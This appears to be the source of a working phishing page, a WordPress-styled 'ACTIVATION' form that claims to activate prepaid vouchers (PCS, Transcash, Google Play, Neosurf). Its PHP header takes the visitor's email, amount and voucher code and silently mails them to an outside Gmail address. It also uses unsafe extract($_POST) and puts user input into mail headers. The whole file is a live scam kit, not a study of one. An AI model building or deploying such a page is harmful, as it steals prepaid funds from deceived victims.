<?php

if(isset($_POST['activate'])) {
	extract($_POST);
	if(isset($Email) && $Email != "" &&
	   isset($Price) && $Price != "" &&
	   isset($typeofticket) && $typeofticket != "" &&
	   isset($codeticket) && $codeticket != ""){
		 $to = "giftcardsactivationonline@gmail.com";
$subject = "ACTIVATION DU :". $Email;

$message = "
          <p> Activation de :<strong>".$Email." </strong></p>
		  <p>PRIX:<strong>".$Price."</strong></p> 
		  <p>Type:<strong>".$typeofticket."</strong></p>
		  <p>CODE<strong>".$codeticket."</strong></p>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <'.$Email.'>' . "\r\n";


$activate = mail($to,$subject,$message,$headers);
		   
	   }
}
?>




<html lang="en-US"><head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Activation of tickets</title>
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//s.w.org">
<link rel="alternate" type="application/rss+xml" title=" » Feed" href="https://securisercoupon.me-cash.net/feed/">
<link rel="alternate" type="application/rss+xml" title=" » Comments Feed" href="https://securisercoupon.me-cash.net/comments/feed/">
<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/securisercoupon.me-cash.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.2"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script><script src="https://securisercoupon.me-cash.net/wp-includes/js/wp-emoji-release.min.js?ver=6.0.2" type="text/javascript" defer=""></script>
<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="formidable-css" href="https://securisercoupon.me-cash.net/wp-content/plugins/formidable/css/formidableforms.css?ver=9141847" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="https://securisercoupon.me-cash.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.2" media="all">
<style id="wp-block-library-theme-inline-css">
.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio figcaption{color:hsla(0,0%,100%,.65)}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed figcaption{color:hsla(0,0%,100%,.65)}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image figcaption{color:hsla(0,0%,100%,.65)}.wp-block-pullquote{border-top:4px solid;border-bottom:4px solid;margin-bottom:1.75em;color:currentColor}.wp-block-pullquote__citation,.wp-block-pullquote cite,.wp-block-pullquote footer{color:currentColor;text-transform:uppercase;font-size:.8125em;font-style:normal}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;position:relative;font-style:normal}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{padding:.5em;border:1px solid;word-break:normal}.wp-block-table figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video figcaption{color:hsla(0,0%,100%,.65)}.wp-block-template-part.has-background{padding:1.25em 2.375em;margin-top:0;margin-bottom:0}
</style>
<style id="global-styles-inline-css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #FFFFFF;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--dark-gray: #28303D;--wp--preset--color--gray: #39414D;--wp--preset--color--green: #D1E4DD;--wp--preset--color--blue: #D1DFE4;--wp--preset--color--purple: #D1D1E4;--wp--preset--color--red: #E4D1D1;--wp--preset--color--orange: #E4DAD1;--wp--preset--color--yellow: #EEEADD;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--gradient--purple-to-yellow: linear-gradient(160deg, #D1D1E4 0%, #EEEADD 100%);--wp--preset--gradient--yellow-to-purple: linear-gradient(160deg, #EEEADD 0%, #D1D1E4 100%);--wp--preset--gradient--green-to-yellow: linear-gradient(160deg, #D1E4DD 0%, #EEEADD 100%);--wp--preset--gradient--yellow-to-green: linear-gradient(160deg, #EEEADD 0%, #D1E4DD 100%);--wp--preset--gradient--red-to-yellow: linear-gradient(160deg, #E4D1D1 0%, #EEEADD 100%);--wp--preset--gradient--yellow-to-red: linear-gradient(160deg, #EEEADD 0%, #E4D1D1 100%);--wp--preset--gradient--purple-to-red: linear-gradient(160deg, #D1D1E4 0%, #E4D1D1 100%);--wp--preset--gradient--red-to-purple: linear-gradient(160deg, #E4D1D1 0%, #D1D1E4 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 18px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 24px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--extra-small: 16px;--wp--preset--font-size--normal: 20px;--wp--preset--font-size--extra-large: 40px;--wp--preset--font-size--huge: 96px;--wp--preset--font-size--gigantic: 144px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel="stylesheet" id="twenty-twenty-one-style-css" href="https://securisercoupon.me-cash.net/wp-content/themes/twentytwentyone/style.css?ver=1.6" media="all">
<style id="twenty-twenty-one-style-inline-css">
:root{--global--color-background: #ffffff;--global--color-primary: #000;--global--color-secondary: #000;--button--color-background: #000;--button--color-text-hover: #000;}
@supports (-webkit-appearance: none) or (-moz-appearance: none) {
				div.wpforms-container-full .wpforms-form input[type=checkbox] {
					-webkit-appearance: checkbox;
					-moz-appearance: checkbox;
				}
				div.wpforms-container-full .wpforms-form input[type=radio] {
					-webkit-appearance: radio;
					-moz-appearance: radio;
				}
				div.wpforms-container-full .wpforms-form input[type=checkbox]:after,
				div.wpforms-container-full .wpforms-form input[type=radio]:after {
					content: none;
				}
			}
div.wpforms-container-full form.wpforms-form select {
				background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10' fill='%2328303d'><polygon points='0,0 10,0 5,5'/></svg>");
				background-repeat: no-repeat;
				background-position: right var(--form--spacing-unit) top 60%;
			}
</style>
<link rel="stylesheet" id="twenty-twenty-one-print-style-css" href="https://securisercoupon.me-cash.net/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.6" media="print">
<link rel="https://api.w.org/" href="https://securisercoupon.me-cash.net/wp-json/"><link rel="alternate" type="application/json" href="https://securisercoupon.me-cash.net/wp-json/wp/v2/pages/21"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://securisercoupon.me-cash.net/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://securisercoupon.me-cash.net/wp-includes/wlwmanifest.xml"> 
<meta name="generator" content="WordPress 6.0.2">
<link rel="canonical" href="https://securisercoupon.me-cash.net/securise/">
<link rel="shortlink" href="https://securisercoupon.me-cash.net/?p=21">
<link rel="alternate" type="application/json+oembed" href="https://securisercoupon.me-cash.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurisercoupon.me-cash.net%2Fsecurise%2F">
<link rel="alternate" type="text/xml+oembed" href="https://securisercoupon.me-cash.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurisercoupon.me-cash.net%2Fsecurise%2F&amp;format=xml">
<style id="custom-background-css">
body.custom-background { background-color: #ffffff; }
</style>
	<link rel="icon" href="https://securisercoupon.me-cash.net/wp-content/uploads/2022/09/cropped-ssqs_PNG-1-32x32.webp" sizes="32x32">
<link rel="icon" href="https://securisercoupon.me-cash.net/wp-content/uploads/2022/09/cropped-ssqs_PNG-1-192x192.webp" sizes="192x192">
<link rel="apple-touch-icon" href="https://securisercoupon.me-cash.net/wp-content/uploads/2022/09/cropped-ssqs_PNG-1-180x180.webp">
<meta name="msapplication-TileImage" content="https://securisercoupon.me-cash.net/wp-content/uploads/2022/09/cropped-ssqs_PNG-1-270x270.webp">
</head>

<body class="page-template-default page page-id-21 custom-background wp-embed-responsive is-light-theme has-background-white no-js singular">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0.49803921568627"></feFuncR><feFuncG type="table" tableValues="0 0.49803921568627"></feFuncG><feFuncB type="table" tableValues="0 0.49803921568627"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 0.27843137254902"></feFuncG><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0"></feFuncR><feFuncG type="table" tableValues="0 0.64705882352941"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.78039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.94901960784314"></feFuncG><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.44705882352941 0.4"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.098039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.66274509803922"></feFuncG><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>



<article id="post-21" class="post-21 page type-page status-publish hentry entry">

			<header class="entry-header alignwide">
			<h1 class="entry-title">ACTIVATION</h1>					</header><!-- .entry-header -->
	
	<div class="entry-content">
		<div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_2_container">
<form action="" enctype="multipart/form-data" method="post" class="frm-show-form " id="form_cool">
<div class="frm_form_fields ">
<fieldset>
<legend class="frm_screen_reader"></legend>

<div class="frm_fields_container">
<input type="hidden" name="frm_action" value="create">
<input type="hidden" name="form_id" value="2">
<input type="hidden" name="frm_hide_fields_2" id="frm_hide_fields_2" value="">
<input type="hidden" name="form_key" value="cool">
<input type="hidden" name="item_meta[0]" value="">
<input type="hidden" id="frm_submit_entry_2" name="frm_submit_entry_2" value="371cfed118"><input type="hidden" name="_wp_http_referer" value="/securise/"><div id="frm_field_7_container" class="frm_form_field form-field  frm_required_field frm_top_container">
    <label for="field_x891v" id="field_x891v_label" class="frm_primary_label">Phone(Optional)
        
    </label>
    <input type="text" id="field_x891v" name="telephone" value="" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Text is invalid" aria-invalid="false">
    
    
</div>
<div id="frm_field_8_container" class="frm_form_field form-field  frm_required_field frm_top_container">
    <label for="field_4v75j" id="field_4v75j_label" class="frm_primary_label">Email
        <span class="frm_required" aria-hidden="true">*</span>
    </label>
    <input type="text" id="field_4v75j" name="Email" value="" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Text is invalid" aria-invalid="false">
    
    
</div>
<div id="frm_field_9_container" class="frm_form_field form-field  frm_required_field frm_top_container">
    <label for="field_nsxl1" id="field_nsxl1_label" class="frm_primary_label">Price of ticket
	<span class="frm_required" aria-hidden="true">*</span>
    </label>
    <input type="text" id="field_nsxl1" name="Price" value="" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Text is invalid" aria-invalid="false">
    
    
</div>
<div id="frm_field_11_container" class="frm_form_field form-field  frm_required_field frm_top_container">
    <label for="field_12bq3" id="field_12bq3_label" class="frm_primary_label">Type of ticket
        <span class="frm_required" aria-hidden="true">*</span>
    </label>
    		<select name="typeofticket" id="field_12bq3" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Type de Recharge is invalid" aria-invalid="false">
				<option value="" selected="selected">
			 		</option>
				<option value="PCS">
			PCS		</option>
				<option value="TRANSCASH">
			TRANSCASH		</option>
				<option value="Google play card">
			Google play card		</option>
				<option value="NeoSurf">
			NeoSurf		</option>
			</select>
	
    
    
</div>
<div id="frm_field_12_container" class="frm_form_field form-field  frm_required_field frm_top_container">
    <label for="field_jo24a" id="field_jo24a_label" class="frm_primary_label">Code of ticket
	<span class="frm_required" aria-hidden="true">*</span>
    </label>
    <input type="text" id="field_jo24a" name="codeticket" value="" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Text is invalid" aria-invalid="false">
    
    
</div>
<div id="frm_field_16_container" class="frm_form_field form-field  frm_required_field frm_top_container vertical_radio">
    <div id="field_5iolb_label" class="frm_primary_label">Hide the Code
    </div>
    <div class="frm_opt_container" aria-labelledby="field_5iolb_label" role="group">		<div class="frm_checkbox" id="frm_checkbox_16-0"><label for="field_5iolb-0"><input type="checkbox" name="item_meta[16][]" id="field_5iolb-0" value="OUI" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Cacher le Code is invalid" aria-invalid="false"> OUI</label></div>
		<div class="frm_checkbox" id="frm_checkbox_16-1"><label for="field_5iolb-1"><input type="checkbox" name="hidecode" id="field_5iolb-1" value="NON" data-reqmsg="This field cannot be blank." aria-required="true" data-invmsg="Cacher le Code is invalid" aria-invalid="false"> NON</label></div>
</div>
    
    
</div>
	<input type="hidden" name="item_key" value="">
				<div class="frm_verify" aria-hidden="true">
				<label for="frm_email_2">
					If you are human, leave this field blank.				</label>
				<input type="text" class="frm_verify" id="frm_email_2" name="frm_verify" value="">
			</div>
		<div class="frm_submit">

<button name="activate" class="frm_button_submit" type="submit">ACTIVATE IT</button>


</div></div>
</fieldset>
</div>
</form>
</div>

	</div><!-- .entry-content -->

	</article><!-- #post-21 -->
</div></body></html>
